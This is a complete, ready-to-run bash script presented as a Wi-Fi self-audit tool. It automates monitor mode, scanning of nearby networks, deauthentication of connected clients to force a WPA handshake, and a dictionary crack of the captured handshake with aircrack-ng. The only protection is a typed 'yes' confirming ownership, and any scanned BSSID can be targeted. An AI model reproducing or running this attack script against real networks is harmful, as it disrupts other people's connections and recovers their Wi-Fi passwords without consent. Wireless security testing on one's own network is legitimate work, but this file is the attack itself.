#!/usr/bin/env bash
#
# wifi-audit.sh - Test the security of YOUR OWN Wi-Fi (a network you own).
# Run on a Linux laptop (Kali/Ubuntu) with a Wi-Fi card that supports monitor mode.
#
# Usage:  sudo ./wifi-audit.sh [optional_wordlist_path]
#
set -uo pipefail   # note: no `-e` so a single failing command never kills the run

# ---------- colors / logging ----------
R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"; N="\033[0m"
info(){ echo -e "${C}[*]${N} $*"; }
ok(){   echo -e "${G}[+]${N} $*"; }
warn(){ echo -e "${Y}[!]${N} $*"; }
err(){  echo -e "${R}[x]${N} $*" >&2; }

# ---------- 0) legal warning ----------
clear
cat <<'BANNER'
==========================================================
   Wi-Fi Security Audit - ONLY on a network you own.
   Testing someone else's network without permission
   is illegal.
==========================================================
BANNER
read -rp "Do you confirm you OWN this Wi-Fi? (yes/no) " AGREE
[[ "$AGREE" == "yes" ]] || { err "Aborted."; exit 1; }

# ---------- 1) must be root ----------
[[ $EUID -eq 0 ]] || { err "Run as root:  sudo $0"; exit 1; }

# ---------- 2) install dependencies ----------
info "Checking dependencies (aircrack-ng)..."
if ! command -v airmon-ng >/dev/null 2>&1; then
  if   command -v apt    >/dev/null 2>&1; then apt update -y && apt install -y aircrack-ng
  elif command -v pacman >/dev/null 2>&1; then pacman -Sy --noconfirm aircrack-ng
  elif command -v dnf    >/dev/null 2>&1; then dnf install -y aircrack-ng
  else err "Unknown package manager; install aircrack-ng manually."; exit 1
  fi
fi
command -v airmon-ng >/dev/null 2>&1 || { err "aircrack-ng install failed."; exit 1; }
ok "aircrack-ng ready."

# ---------- 3) pick the Wi-Fi interface ----------
info "Available Wi-Fi interfaces:"
mapfile -t IFACES < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
[[ ${#IFACES[@]} -gt 0 ]] || { err "No Wi-Fi interface found."; exit 1; }
select IFACE in "${IFACES[@]}"; do [[ -n "${IFACE:-}" ]] && break; done
ok "Selected interface: $IFACE"

# ---------- 4) enable monitor mode ----------
info "Enabling monitor mode..."
airmon-ng check kill >/dev/null 2>&1 || true
BEFORE="$(iw dev | awk '/Interface/{print $2}' | sort)"
airmon-ng start "$IFACE" >/dev/null 2>&1 || true
sleep 2
AFTER="$(iw dev | awk '/Interface/{print $2}' | sort)"
MON="$(comm -13 <(echo "$BEFORE") <(echo "$AFTER") | head -1)"
[[ -z "$MON" ]] && MON="$IFACE"
if ! iw dev "$MON" info 2>/dev/null | grep -q "type monitor"; then
  ip link set "$MON" down 2>/dev/null || true
  iw dev "$MON" set type monitor 2>/dev/null || true
  ip link set "$MON" up 2>/dev/null || true
fi
if iw dev "$MON" info 2>/dev/null | grep -q "type monitor"; then
  ok "Monitor mode active on: $MON"
else
  err "Could not enable monitor mode on $MON; card may not support it."
  exit 1
fi

# ---------- cleanup: always restore Wi-Fi on exit ----------
cleanup(){
  warn "Restoring interface and Wi-Fi..."
  airmon-ng stop "$MON" >/dev/null 2>&1 || true
  ip link set "$MON" down 2>/dev/null || true
  iw dev "$MON" set type managed 2>/dev/null || true
  ip link set "$MON" up 2>/dev/null || true
  systemctl restart NetworkManager 2>/dev/null \
    || service network-manager restart 2>/dev/null \
    || systemctl restart wpa_supplicant 2>/dev/null || true
  nmcli radio wifi on 2>/dev/null || true
  ok "Done. If Wi-Fi did not reconnect, just reboot the laptop."
}
trap cleanup EXIT

# ---------- 5) scan networks ----------
WORK="$(mktemp -d)"; cd "$WORK"
info "Scanning networks (~15s)... please wait, the list will appear."
airodump-ng --output-format csv -w scan "$MON" >/dev/null 2>&1 &
SCAN=$!
sleep 15
kill -INT "$SCAN" 2>/dev/null || true
sleep 2
kill -9 "$SCAN" 2>/dev/null || true
echo
info "Networks found:"
CSV="$(ls -t scan-*.csv 2>/dev/null | head -1)"
[[ -n "$CSV" ]] || { err "Scan produced no output; card/monitor problem."; exit 1; }
awk -F',' '$1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
  gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$4); gsub(/^ +| +$/,"",$14);
  printf "%2d) SSID: %-25s BSSID: %s  CH: %s\n", ++i, $14, $1, $4}' "$CSV" | tee nets.txt
[[ -s nets.txt ]] || { err "No networks found. Wait a few seconds and retry."; exit 1; }

echo
read -rp "Enter the BSSID of YOUR Wi-Fi (AA:BB:CC:DD:EE:FF): " BSSID
read -rp "Enter its channel (CH): " CH

# ---------- 6) capture handshake (robust loop) ----------
info "Listening for handshake on $BSSID (channel $CH)..."
airodump-ng -c "$CH" --bssid "$BSSID" -w cap "$MON" >/dev/null 2>&1 &
DUMP=$!
sleep 5

GOT=0
# Up to 8 rounds: find connected clients, deauth them TARGETED, then check.
for round in 1 2 3 4 5 6 7 8; do
  CSVCAP="$(ls -t cap-*.csv 2>/dev/null | head -1)"
  CLIENTS=""
  if [[ -n "$CSVCAP" ]]; then
    # station section: columns are  StationMAC,...,...,...,packets,BSSID,...
    CLIENTS="$(awk -F',' -v B="$BSSID" '
      /Station MAC/{s=1; next}
      s && $1 ~ /^([0-9A-Fa-f]{2}:){5}/ {
        gsub(/[[:space:]]/,"",$1); gsub(/[[:space:]]/,"",$6);
        if (toupper($6)==toupper(B)) print $1 }' "$CSVCAP")"
  fi

  if [[ -n "$CLIENTS" ]]; then
    info "Round $round/8: found connected client(s), sending TARGETED deauth..."
    while read -r STA; do
      [[ -n "$STA" ]] && aireplay-ng --deauth 10 -a "$BSSID" -c "$STA" "$MON" >/dev/null 2>&1 || true
    done <<< "$CLIENTS"
  else
    info "Round $round/8: no client seen yet, broadcast deauth..."
    aireplay-ng --deauth 10 -a "$BSSID" "$MON" >/dev/null 2>&1 || true
  fi

  sleep 10
  CAP="$(ls -t cap-*.cap 2>/dev/null | head -1)"
  if [[ -n "$CAP" ]] && aircrack-ng "$CAP" 2>/dev/null | grep -q "1 handshake"; then
    GOT=1; break
  fi
  info "No handshake yet, retrying..."
done
kill "$DUMP" 2>/dev/null || true

if [[ "$GOT" -ne 1 ]]; then
  err "No handshake captured."
  err "A device (phone/laptop) must be connected to this Wi-Fi so it can reconnect."
  err "Connect a device to the Wi-Fi, then run this script again."
  exit 1
fi
ok "Handshake captured."

# ---------- 7) test the password against a wordlist ----------
WL="${1:-}"
if [[ -z "$WL" ]]; then
  for c in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz \
           /usr/share/wordlists/nmap.lst /usr/share/dict/words; do
    [[ -f "$c" ]] && { WL="$c"; break; }
  done
fi
if [[ "$WL" == *.gz && -f "$WL" ]]; then
  info "Decompressing wordlist (one time)..."
  gunzip -kf "$WL"
  WL="${WL%.gz}"
fi
if [[ ! -f "$WL" ]]; then
  err "No wordlist found. Re-run with a wordlist path, e.g.:"
  err "   sudo ./wifi-audit.sh /usr/share/wordlists/rockyou.txt"
  exit 1
fi

info "Testing password with: $WL"
info "This can take a few seconds to a few minutes; please wait..."
aircrack-ng -w "$WL" -b "$BSSID" "$CAP" | tee result.txt

echo
if grep -q "KEY FOUND" result.txt; then
  err "RESULT: PASSWORD CRACKED -> it is WEAK. The key is on the 'KEY FOUND' line above. Change it!"
else
  ok "RESULT: password NOT in this wordlist -> reasonably strong."
fi

echo
info "Output files are in: $WORK"
